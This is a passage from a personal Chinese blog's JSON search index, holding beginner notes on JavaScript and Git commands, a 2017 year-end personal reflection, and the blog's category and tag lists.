|| Tip 3 | 1.3 | 3.2 | 3.3 | 8.图表图表制作参考链接 本文参考链接参考链接","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://liuyi12138.github.io/categories/工具使用/"}],"tags":[{"name":"markdown","slug":"markdown","permalink":"https://liuyi12138.github.io/tags/markdown/"}]},{"title":"JavaScript学习笔记5--对象","slug":"JavaScript学习笔记5--对象","date":"2018-04-07T07:52:08.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/07/JavaScript学习笔记5--对象/","link":"","permalink":"https://liuyi12138.github.io/2018/04/07/JavaScript学习笔记5--对象/","excerpt":"慕课网实操学习–对象","text":"慕课网实操学习–对象 字符串对象 stringObject.charAt(index) ——charAt() 方法可返回指定位置的字符。返回的字符 是长度为 1 的字符串 stringObject.indexOf(substring, startpos) ——indexOf() 方法返回某个指定 的字符串值在字符串中首次出现的位置 stringObject.split(separator,limit) ——split() 方法将字符串分割为字符串 数组，并返回此数组 12.28.1 stringObject.substring(startPos,stopPos) ——substring() 方法用于提取字 符串中介于两个指定下标之间的字符 12.28.２ stringObject.substr(startPos,length) ——substr() 方法从字符串中提取从 startPos位置开始的指定数目的字符串 12.28.３ Math 对象是一个固有的对象，无需创建它，直接把 Math 作为对象使用就可以调用其所有属性和方法。这是它与Date,String对象的区别 12.28.4 数组对象 数组对象是一个对象的集合，里边的对象可以是不同类型的。数组的每一个成员对象都有一个“下标”，用来表示它在数组中的位置，是从零开始的 12.28.5","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://liuyi12138.github.io/tags/JavaScript/"}]},{"title":"JavaScript学习笔记4--互动方法","slug":"JavaScript学习笔记4--互动方法","date":"2018-04-07T07:51:35.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/07/JavaScript学习笔记4--互动方法/","link":"","permalink":"https://liuyi12138.github.io/2018/04/07/JavaScript学习笔记4--互动方法/","excerpt":"慕课网实操学习–常用互动方法","text":"慕课网实操学习–常用互动方法 document.write() 可用于直接向 HTML 输出流写内容。简单的说就是直接在网页中输出内容 alert(字符串或变量); ——alert弹出消息对话框(包含一个确定按钮) confirm(str); ——confirm弹出对话框(包括一个确定按钮和一个取消按钮) prompt(str1, str2); ——prompt弹出消息对话框（包含一个确定按钮、取消按钮与一个文本输入框） window.open([URL], [窗口名称], [参数字符串]) ——open() 方法可以查找一个已经存在或者新建的浏览器窗口 window.close(); //关闭本窗口 &lt;窗口对象&gt;.close(); //关闭指定的窗口 文档对象模型DOM（Document Object Model）定义访问和处理HTML文档的标准方法。DOM 将HTML文档呈现为带有元素、属性和文本的树结 构（节点树） 12.25.1 document.getElementById(“id”) ——获取的元素是一个对象，如想对元素进行操作，我们要通过它的属性或方法 Object.innerHTML ——innerHTML 属性用于获取或替换 HTML 元素的内容 Object.style.property=new style; Object.style.display = value; ——none(隐藏) block(显示) object.className = classname ——className 属性设置或返回元素的class 属性","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://liuyi12138.github.io/tags/JavaScript/"}]},{"title":"JavaScript学习笔记３--标准对象","slug":"JavaScript学习笔记３--标准对象","date":"2018-04-07T06:40:10.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/07/JavaScript学习笔记３--标准对象/","link":"","permalink":"https://liuyi12138.github.io/2018/04/07/JavaScript学习笔记３--标准对象/","excerpt":"js与c的比较学习标准对象","text":"js与c的比较学习标准对象 Date Date对象用来表示日期和时间。 1234567891011var now = new Date();now; // Wed Jun 24 2015 19:49:22 GMT+0800 (CST)now.getFullYear(); // 2015, 年份now.getMonth(); // 5, 月份，注意月份范围是0~11，5表示六月now.getDate(); // 24, 表示24号now.getDay(); // 3, 表示星期三now.getHours(); // 19, 24小时制now.getMinutes(); // 49, 分钟now.getSeconds(); // 22, 秒now.getMilliseconds(); // 875, 毫秒数now.getTime(); // 1435146562875, 以number形式表示的时间戳 var d = new Date(2015, 5, 19, 20, 15, 30, 123); ——创建一个指定日期和时间的Date对象 JavaScript的Date对象月份值从0开始，牢记0=1月，1=2月，2=3月，……，11=12月 var d = Date.parse(‘2015-06-24T19:49:22.875+08:00’); ——解析一个符合ISO 8601格式的字符串，但它返回的不是Date对象，而是一个时间戳 var d = new Date(1435146562875); ——把时间戳转换为Date对象 使用Date.parse()时传入的字符串使用实际月份1-12，转换为Date对象后getMonth()获取的月份值为0-11。 RegExp 在正则表达式中，用*表示任意个字符（包括0个），用+表示至少一个字符，用?表示0个或1个字符，用{n}表示n个字符，用{n,m}表示n-m个字符 ‘-‘是特殊字符，在正则表达式中，要用’\\’转义 \\s匹配空格 要做更精确地匹配，可以用[]表示范围 正则表达式进阶 创建一个正则表达式12var re1 = /ABC\\-001/;var re2 = new RegExp('ABC\\\\-001'); 如果使用第二种写法，因为字符串的转义问题，字符串的两个\\实际上是一个\\ re.test(‘….’)； ——RegExp对象的test()方法用于测试给定的字符串是否符合条件 ‘a,b;; c d’.split(/[\\s\\,\\;]+/); // [‘a’, ‘b’, ‘c’, ‘d’] ——切分字符串 分组——除了简单地判断是否匹配之外，正则表达式还有提取子串的强大功能。用()表示的就是要提取的分组（Group） 12var re = /^(\\d&#123;3&#125;)-(\\d&#123;3,8&#125;)$/;re.exec('010-12345'); // ['010-12345', '010', '12345'] ——在RegExp对象上用exec()方法提取出子串来。 exec()方法在匹配成功后，会返回一个Array，第一个元素是正则表达式匹配到的整个字符串，后面的字符串表示匹配成功的子串 正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符 加个?就可以让\\d+采用非贪婪匹配 全局搜索 123var r1 = /test/g;// 等价于:var r2 = new RegExp('test', 'g'); 全局匹配可以多次执行exec()方法来搜索一个匹配的字符串。当我们指定g标志后，每次运行exec()，正则表达式本身会更新lastIndex属性，表示上次匹配到的最后索引 全局匹配类似搜索，因此不能使用/^…$/，那样只会最多匹配一次 正则表达式还可以指定i标志，表示忽略大小写，m标志，表示执行多行匹配 JSONJSON中的数据类型 number：和JavaScript的number完全一致 boolean：就是JavaScript的true或false string：就是JavaScript的string null：就是JavaScript的null array：就是JavaScript的Array表示方式——[] object：就是JavaScript的{ … }表示方式 JSON的字符串规定必须用双引号””，Object的键也必须用双引号”” var s = JSON.stringify(xiaoming); ——把小明这个对象序列化成JSON格式的字符串 JSON可以加上参数，第一个参数是对象，第二个参数用于控制如何筛选对象的键值，还可以传入一个函数 JSON.parse(‘[1,2,3]’) ——反序列化，把一个JSON格式的字符串变成一个JavaScript对象","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://liuyi12138.github.io/tags/JavaScript/"}]},{"title":"JavaScript学习笔记2--函数","slug":"JavaScript学习笔记2--函数","date":"2018-04-07T06:35:46.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/07/JavaScript学习笔记2--函数/","link":"","permalink":"https://liuyi12138.github.io/2018/04/07/JavaScript学习笔记2--函数/","excerpt":"js与c的比较学习函数","text":"js与c的比较学习函数 函数的定义与调用 js中可将函数赋值给一个变量。 var abs=function(x){…} argumentsc只在函数内部起作用，并且永远指向传入的所有参数。arguments[i] arguments.length ——判断传入参数的个数 rest函数:12345function exm(a,b,...rest)&#123;console.log('a = '+ a);console.log('b = '+ b);console.log(rest);&#125; 变量作用域与解构赋值 JavaScript的函数在查找变量时从自身函数定义开始，从“内”向“外”查找。如果内部函数定义了与外部函数重名的变量，则内部函数的变量将“屏蔽”外部函数的变量。 JavaScript会将所有申明的变量提升到函数顶部，所以尽量在函数顶部申明变量并赋值。 JavaScript默认有一个全局变量window,声明的全局变量会绑定到window上，访问全局变量course和访问window.course等价 可把全局变量都绑定在唯一的名字空间，var MYAPP={};MYAPP.name=’myapp’; 解构赋值 var[x,y,z]=[1,2,3]; 如果需要从一个对象中取出若干属性，也可以使用解构赋值，便于快速获取对象的指定属性 解构赋值简化代码： [x,y]=[y,x] 方法 在一个对象中绑定函数，称为这个对象的方法 在一个方法内部，this是一个特殊变量，它始终指向当前对象 用var that = this;，就可以放心地在方法内部定义其他函数，而不是把所有语句都堆到一个方法中。 apply 在function.apply(对象，[参数]) ——apply接收两个参数，一个是需要绑定的this变量，另一个是包含函数本身参数的数组 apply与call的区别：apply()把参数打包成Array再传入；call()把参数按顺序传入。 12Math.max.apply(null, [3, 5, 4]);Math.max.call(null, 3, 5, 4); 装饰器 apply() 123456var count = 0;var oldParseInt = parseInt; // 保存原函数window.parseInt = function () &#123; count += 1; return oldParseInt.apply(null, arguments); // 调用原函数&#125;; 高阶函数 接收另一个函数作为参数的函数叫做高阶函数 map/reduce arr.map(function) ——将arr中的每个参数依次传入function中 map()传入的参数是函数对象本身 reduce必须接收两个参数，并把结果和序列的下一个元素做累积计算 filter filter用于把Array中的某些元素过滤掉，filter也接收一个函数，然后把传入的函数依次作用于每个元素，根据返回值确定是否保留该元素 filter()接收的回调函数，其实可以有多个参数。通常我们仅使用第一个参数，表示Array的某个元素。回调函数还可以接收另外两个参数，表示元素的位置和数组本身 1234567var arr = ['A', 'B', 'C'];var r = arr.filter(function (element, index, self) &#123; console.log(element); // 依次打印'A', 'B', 'C' console.log(index); // 依次打印0, 1, 2 console.log(self); // self就是变量arr return true;&#125;); 可以利用filter去掉重复元素 123r = arr.filter(function (element, index, self) &#123; return self.indexOf(element) === index;&#125;); sort Array的sort()方法默认把所有元素先转换为String再排序，要自定义一个函数才能对数字进行大小排序 sort()方法会直接对Array进行修改，它返回的结果仍是当前Array 闭包 高阶函数除了可以接受函数作为参数外，还可以把函数作为结果值返回。 在函数function1中又定义了函数function2，并且，内部函数function2可以引用外部函数function1的参数和局部变量，当function1返回函数function2时，相关参数和变量都保存在返回的函数中。这种程序结构被称作闭包。 当我们调用function1时，每次调用都会返回一个新的函数。即使传入的参数相同，返回的函数也不同 返回闭包时牢记的一点就是：返回函数不要引用任何循环变量，或者后续会发生变化的变量。 箭头函数(Arrow Function) 箭头函数包含一条语句 x =&gt; x+x 相当于 function(x){return x+x;} 箭头函数包含多条语句 x =&gt;{… return …;} 如果参数不是一个，就需要用括号()括起来 (x,y,…rest) x =&gt; ({ foo: x }) ——返回一个对象 箭头函数内部的this总是指向词法作用域，也就是外层调用者 用call()或者apply()调用箭头函数时，无法对this进行绑定，即传入的第一个参数被忽略 generator generator和函数不同的是，generator由function定义（注意多出的号），并且，除了return语句，还可以用yield返回多次。 12345function* foo(x) &#123; yield x + 1; yield x + 2; return x + 3;&#125; 1.function.next(); —— next()方法会执行generator的代码，然后，每次遇到yield x;就返回一个对象{value: x, done: true/false}，然后“暂停”。返回的value就是yield的返回值，done表示这个generator是否已经执行结束了。如果done为true，则value就是return的返回值。 2.直接用for … of循环迭代generator对象，这种方式不需要我们自己判断done1for(var x of function(10))&#123;...&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://liuyi12138.github.io/tags/JavaScript/"}]},{"title":"JavaScript学习笔记１--基本语法","slug":"JavaScript学习笔记１--基本语法","date":"2018-04-07T06:33:28.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/07/JavaScript学习笔记１--基本语法/","link":"","permalink":"https://liuyi12138.github.io/2018/04/07/JavaScript学习笔记１--基本语法/","excerpt":"js与c的比较学习","text":"js与c的比较学习 所有的声明用var 输出用alert console.log()页面内输出 数据类型 不区分整数与浮点数，字符串用单引号或双引号括起来 注意＝＝＝，NaN！＝ＮaN,isNaN(NaN)=true 一般 use strict 字符串 多行字符串用“｀” 字符串可用＋连接 s.length s.toUpprCase() 字符串函数 toUpperCase(s)把一个字符串全部变成大写 toLowerCase(s)把一个字符串全部变成小写 indexOf(‘hello’)搜索字符串出现的位置，返回数字，未找到返回-1 substring(x,y)返回指定索引区间的子串 数组 new Array(1,2,3)或var arr=[1,2,3]创建数组 arr.length arr.indexOf(10)–返回10的索引 arr.slice(0,3)–返回0-3的值，不包括３(可不要结束索引)(不传递任何参数则截取全部元素) arr.push(‘A’,’B’)–在Array末尾添加元素 arr.pop()–删除最后一个元素，空数组继续pop不会报错，而是返回undefined arr.unshift(‘A’,’b’)–在Array头部添加元素 arr.shift()–删除第一个元素，空数组继续shift不会报错，而是返回undefined arr.sort()–将数组排序排序 arr.reverse()–把数组反转 arr.splice(2,3,’A’,’B’–删除从２开始的３个元素在此处加上A,B arr.concat([1,2,3])–在该数组后加上数组[1,2,3] ,concat()没有修改当前数组而是返回一个新的数组 arr.join(‘-‘)–将数组中的元素用’-‘连接，返回一个字符串，如果数组的元素不是字符串，将自动转换为字符串后再连接 var arr=[[1,2,3],[a,b,c]]多维数组 对象 JavaScript的对象是一种无序的集合数据类型，它由若干键值对组成。 js中键必须是字符串，解决方案见Map {…}表示对象, xxx: xxx键值对声明 ‘某属性’ in 某对象 判断对象中是否存在某属性 条件判断和循环基本与Ｃ一致 Mep和Set Map是一组键值对结构 var m=new Map=[‘A’,1] ——声明一个Map m.set(‘B’,2) ——添加新的键值对 m.has(‘A’) ——是否存在key’A’ m.get(‘A’) ——1 m.delete(‘A’) ——删除键值对 Set是一组key的集合，不储存value var s1=new Set([1,2,3]) ——创建一个Set Set中没有重复的key,重复元素被自动过滤 数字与字符串是不同的元素 s.add(key) ——添加key到Set s.delete(key) ——删除key iterable Array,Map,Set都属于iterable类型 for(var x of a) ——遍历a for…of与for..in ——拒绝for…in 尽量用for…of forEach遍历Array 123456a.forEach(function(element,index,array)&#123;//element:指向当前元素的值//index:指向当前索引//array:指向Array本身console.log(element+',index='+index)&#125;) Set的回调函数前两个参数都是元素本身 Map的回调函数参数依次为value,key,map本身","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://liuyi12138.github.io/tags/JavaScript/"}]},{"title":"Git学习笔记","slug":"Git学习笔记","date":"2018-04-07T06:31:20.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/07/Git学习笔记/","link":"","permalink":"https://liuyi12138.github.io/2018/04/07/Git学习笔记/","excerpt":"Git的常用命令总结","text":"Git的常用命令总结 用户登录操作1.git help ： 显示command的help 2.git config –global user.name”……” : 输入用户名 3.git config –global user.email”…..” ： 输入用户的email 4.git config –list : 查看git用户信息 创建版本库1.mkdir learnigit(版本库名称) ：创建版本库 TIPS： 版本库可手动创建 2.cd d:/rep ： 跳转到D盘的rep文件 3.pwd ： 查看git目前所在路径 4.git init ：将目录变为git管理的仓库 5.git add new_1.txt :添加文本new_1.txt到暂存区 TIPS: 文件名尽量不要含空格和中文 6.git commit -m”此处应有注释“ ：将暂存区的文件提交到版本库 TIPS: git commit时若未加 -m”注释“ 输入小写i修改，Esc键返回，大写ZZ退出 查看及修改1.git status： 查看状态（略写） 2.git diff 文件名 ： 查看修改内容 （详写） 3.git log ： 查看历史记录 （略写） TIPS:当版本较多时，小写q退出 4.git log –preety=oneline （详写） 5.git log -p ： 查看每次详细修改内容的diff 6.git log -p -2 ： 查看最近两次详细修改内容的diff 7.git log –stat ： 查看提交统计信息 8.git show ： 显示某次提交的内容 == git log -p 9.cat 文件名 ：查看文件内容 删除、找回，重置文件1.git reset –hard 版本号（git log 里复制） ：回退到某一版本 2.git reset –hard HEAD^ : 回退一个版本 3.git reset –hrad HEAD^^ : 回退两个版本 4.git reset –hrad HEAD~n ： 回退n个版本 5.git reflog ：查看每一次操作 6.git rm 文件名 ：删除版本库文件 7.git checkout 文件名 : 撤销删除 与远程库有关的操作1.git remote add origin git @github.com:LiuYI12138/Dian_training.git :绑定远程库与本地仓库 2.git push - u origin master :第一次上传文件 3.git push origin master :一般上传文件 4.git pull ：将远程库的文件同步到本地 5.git remote -v ： 查看远程服务器地址和仓库名称 6.git remote show origin ： 查看远程服务器仓库状态 参考链接1 参考链接2 [廖雪峰的Git教程](https://www.liaoxuefeng.com/wiki/0013739516305929606d","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://liuyi12138.github.io/categories/工具使用/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://liuyi12138.github.io/tags/Git/"}]},{"title":"2017年终总结","slug":"2017年终总结","date":"2018-04-07T06:29:02.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/04/07/2017年终总结/","link":"","permalink":"https://liuyi12138.github.io/2018/04/07/2017年终总结/","excerpt":"看见大家都在总结过去的一年，不由得也回忆起来，2017确实是不平凡的一年，仔细一想，在这一年里，我到底做了什么，又有什么没做，有哪些美好的回忆，又有哪些遗憾，认识了哪些人，又和哪些人走丢了， 当初的愿望实现了吗，又有什么新的想法。时光飞逝，又是一年，不愿把生活过得浑浑噩噩，自然是需要盘点与翘盼。 我的2017大事件","text":"看见大家都在总结过去的一年，不由得也回忆起来，2017确实是不平凡的一年，仔细一想，在这一年里，我到底做了什么，又有什么没做，有哪些美好的回忆，又有哪些遗憾，认识了哪些人，又和哪些人走丢了， 当初的愿望实现了吗，又有什么新的想法。时光飞逝，又是一年，不愿把生活过得浑浑噩噩，自然是需要盘点与翘盼。 我的2017大事件 去年今日 事情得从去年今日说起，去年的元旦，是否是不够欢乐，不过哪一年又是欢乐的呢，多半是在平庸中度过。还记得那是高中最后一次元旦晚会，老刘的寓玩于学真是让人印象深刻，我和RaPt都受不了玩这种无聊的游戏，遂相约去自习室做作业，顺便还和老金唠唠嗑，吐槽元旦晚会真的是一年不如一年，可与这个班的情意倒是一年更胜一年了。 忘不了的211 说到学校的传统211考试，也是无比亲切，仿佛那些事情还发生在昨日，考两天，讲一天，上一天课，接着考的制度让人欲罢不能(前不久从阿松那听说衡水的两天考试制度才知道我们学校挺人性化的23333)，只记得当时一直处在低迷期，总是考到学校50名开外，父母表面上说没事没事，其实心里肯定是急得不得了。我自己也是精神状态很差，不过我一直相信，华中科技大学，稳。 高考时刻 不得不说的是高考前的一个星期，每天晚上班上的男生都要齐聚210，八人同床，畅谈人生。还记得寝管的灯光，监狱长的教诲，和着豪猪三兄弟的骚气谈话，编织着我们对未来的畅想。高考的那几天倒没有这么疯狂了，大家都睡得很认真，老刘人也好了很多，康渣开车依旧，仿佛就是第七轮211，考后依然对答案，古诗还是错了两句，可再也没有人让我罚抄了。高考过去得那么轻而易举，大家也都鸟作兽散，没有离别，没有眼泪，好像一切都是那么自然而贴切。有些人，从那以后再也没见过，或许以后也不会见到，老刘，每年都回去看看，还在教高三，还会发脾气。时光的车轮滚滚，连一丝尘土也没留下，那些日子还是崭新的，但再也回不去了。 自主招生 人生第一次面试，确实也不能不写，高中准备了那么久，也是惭愧，生物学了八个月，看了三本书，都不如别人一次人品爆发(谁让生物竞赛只考选择题呢23333)，不过有幸能参加面试，和教授们侃侃而谈，抽到的题目是手机所用的材料，大呼高中闲书没白看，考完果断放弃湖南大学的自招，回家休息，结果也是如人意，给父母上了一道保险，我自己至始至终还是相信裸分也能过的，嘿嘿嘿。 打工之路 高考前对暑假的期望是读书写字，投稿旅游，到了假期一切都不一样了(沮丧脸)，投稿石沉大海，也再无心读书，没钱旅游，整日无所事事，便寻思着找一份工作。想着想着，机会就来了，欣然成为一名作业辅导员，整天教小孩子做作业，自己也抽时间学习编程，总是被老板骂，说我对这份工作不上心，仔细想想也是，每天工作八小时，身心疲惫，工资80元每天，简直是廉价劳动力，体会到了挣钱不易，但自己从心底是看不起这工作的，遂辞职，拿着工资去武当山蹦极了一把，算是犒劳自己了。 新的开始 去年9月，来到了华中科技大学，终于成为了一名大学生，期望着大学的养老式生活。可终究我还没老，扶我起来，我还能学! 终于把大学过成了我害怕的样子，寝室，食堂，自习室，三点一线，学校学风太好，不给人喘息的机会，幸运的是人生第一次当班长，担子很重但不害怕，逐渐变成一个开朗的人，不再是大家嘴里的闷葫芦，还能坚持自己的理想，也遇到了自己喜欢的人。 爱情不易 2017年9月2日，第一次见到她，至今121天，不长也不短，但足够让我爱上一个人。今天早上醒来，一下子就想到了与她在一起的点点滴滴，有开心的，有难过的，这么多天都一起走过，说容易也容易 ，说不易，也确实不易。慢慢习惯了有她的日子，有什么开心的事第一个想与她分享，有什么好东西，都想送给她，爱情真的是很神奇，能让一个自私的人，学会为别人着想。2017是与她走过的第一年，希望明年的此刻，回忆起来，又是满满的幸福。 Dian亮人生 2017年又一件让人兴奋的事，被Dian团队录取。说起与Dian团队的渊源，暑假的时候就被晓宇洗脑，暗暗下定决心加人Dian，开学后成功进入科协技术部，拜倒在宇哥门下潜心学习，终于在冬招过五关斩六将，加人Dian团队。不过，说实话，团队也是真的辛苦，为了追赶众多大佬的步伐，还得继续努力呀。 生日party 2017年末，最后一件令人感动的事。生日当晚和星羽去看了《芳华》，很深刻，也很感人。感谢我的小可爱一直陪着我。第二天回家，本来约了几个人一起吃饭，没想到一回到阳逻，大家都等着我，十几个兄弟，一桌菜，一箱酒，一个大蛋糕，一个被感动的我，这辈子最开心的生日属于2017，属于我的18岁。 盘点了2017年的9个大事件，心里百味陈杂，2017真是精彩的一年，昨晚看了《时间的朋友》跨年演讲，感触颇深，不仅对于我，对整个中国，这一年，都是如此不平凡。对于2018，我的翘盼只有一条，坚持做好自己想做的事，努力成为自己想成的人。","categories":[{"name":"文学","slug":"文学","permalink":"https://liuyi12138.github.io/categories/文学/"}],"tags":[{"name":"总结","slug":"总结","permalink":"https://liuyi12138.github.io/tags/总结/"}]}],"categories":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/categories/面经/"},{"name":"计网","slug":"计网","permalink":"https://liuyi12138.github.io/categories/计网/"},{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"},{"name":"文学","slug":"文学","permalink":"https://liuyi12138.github.io/categories/文学/"},{"name":"前端","slug":"前端","permalink":"https://liuyi12138.github.io/categories/前端/"},{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"},{"name":"Linux","slug":"Linux","permalink":"https://liuyi12138.github.io/categories/Linux/"},{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/categories/城游/"},{"name":"商业思维","slug":"商业思维","permalink":"https://liuyi12138.github.io/categories/商业思维/"},{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"},{"name":"点石创校","slug":"点石创校","permalink":"https://liuyi12138.github.io/categories/点石创校/"},{"name":"Dian团队分享","slug":"Dian团队分享","permalink":"https://liuyi12138.github.io/categories/Dian团队分享/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://liuyi12138.github.io/categories/计算机网络/"},{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/categories/吴军的谷歌方法论/"},{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/categories/机器学习/"},{"name":"工具使用","slug":"工具使用","permalink":"https://liuyi12138.github.io/categories/工具使用/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"},{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"计网","slug":"计网","permalink":"https://liuyi12138.github.io/tags/计网/"},{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/tags/网络安全/"},{"name":"心声","slug":"心声","permalink":"https://liuyi12138.github.io/tags/心声/"},{"name":"数据库","slug":"数据库","permalink":"https://liuyi12138.github.io/tags/数据库/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://liuyi12138.github.io/tags/计算机网络/"},{"name":"操作系统","slug":"操作系统","permalink":"https://liuyi12138.github.io/tags/操作系统/"},{"name":"轮子","slug":"轮子","permalink":"https://liuyi12138.github.io/tags/轮子/"},{"name":"vue","slug":"vue","permalink":"https://liuyi12138.github.io/tags/vue/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"},{"name":"C语言","slug":"C语言","permalink":"https://liuyi12138.github.io/tags/C语言/"},{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"病毒","slug":"病毒","permalink":"https://liuyi12138.github.io/tags/病毒/"},{"name":"DLL","slug":"DLL","permalink":"https://liuyi12138.github.io/tags/DLL/"},{"name":"PE","slug":"PE","permalink":"https://liuyi12138.github.io/tags/PE/"},{"name":"汇编","slug":"汇编","permalink":"https://liuyi12138.github.io/tags/汇编/"},{"name":"Linux","slug":"Linux","permalink":"https://liuyi12138.github.io/tags/Linux/"},{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/tags/城游/"},{"name":"英国游学","slug":"英国游学","permalink":"https://liuyi12138.github.io/tags/英国游学/"},{"name":"商业思维","slug":"商业思维","permalink":"https://liuyi12138.github.io/tags/商业思维/"},{"name":"微信公众号","slug":"微信公众号","permalink":"https://liuyi12138.github.io/tags/微信公众号/"},{"name":"stormzhang","slug":"stormzhang","permalink":"https://liuyi12138.github.io/tags/stormzhang/"},{"name":"shell","slug":"shell","permalink":"https://liuyi12138.github.io/tags/shell/"},{"name":"Python","slug":"Python","permalink":"https://liuyi12138.github.io/tags/Python/"},{"name":"证券投资","slug":"证券投资","permalink":"https://liuyi12138.github.io/tags/证券投资/"},{"name":"点石创校","slug":"点石创校","permalink":"https://liuyi12138.github.io/tags/点石创校/"},{"name":"Dian","slug":"Dian","permalink":"https://liuyi12138.github.io/tags/Dian/"},{"name":"大数据","slug":"大数据","permalink":"https://liuyi12138.github.io/tags/大数据/"},{"name":"区块链","slug":"区块链","permalink":"https://liuyi12138.github.io/tags/区块链/"},{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/tags/算法/"},{"name":"数据结构","slug":"数据结构","permalink":"https://liuyi12138.github.io/tags/数据结构/"},{"name":"电子邮件","slug":"电子邮件","permalink":"https://liuyi12138.github.io/tags/电子邮件/"},{"name":"吴军的谷歌方法论","slug":"吴军的谷歌方法论","permalink":"https://liuyi12138.github.io/tags/吴军的谷歌方法论/"},{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/tags/机器学习/"},{"name":"Web","slug":"Web","permalink":"https://liuyi12138.github.io/tags/Web/"},{"name":"影评","slug":"影评","permalink":"https://liuyi12138.github.io/tags/影评/"},{"name":"立志","slug":"立志","permalink":"https://liuyi12138.github.io/tags/立志/"},{"name":"Vim","slug":"Vim","permalink":"https://liuyi12138.github.io/tags/Vim/"},{"name":"markdown","slug":"markdown","permalink":"https://liuyi12138.github.io/tags/markdown/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://liuyi12138.github.io/tags/JavaScript/"},{"name":"Git","slug":"Git","permalink":"https://liuyi12138.github.io/tags/Git/"},{"name":"总结","slug":"总结","permalink":"https://liuyi12138.github.io/tags/总结/"}]}